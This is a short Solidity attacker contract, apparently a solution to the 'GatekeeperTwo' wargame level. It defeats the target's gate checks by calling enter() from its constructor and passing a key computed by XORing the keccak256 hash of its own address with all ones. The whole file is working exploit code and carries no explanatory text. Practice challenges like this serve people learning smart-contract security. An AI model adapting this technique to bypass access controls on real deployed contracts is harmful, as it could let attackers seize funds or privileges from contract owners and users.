// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeperTwo {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperTwoAttacker {
    IGatekeeperTwo target;

    constructor(address _targetAddress) public {
        target = IGatekeeperTwo(_targetAddress);
        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                (uint64(0) - 1)
        );
        target.enter(key);
    }
}
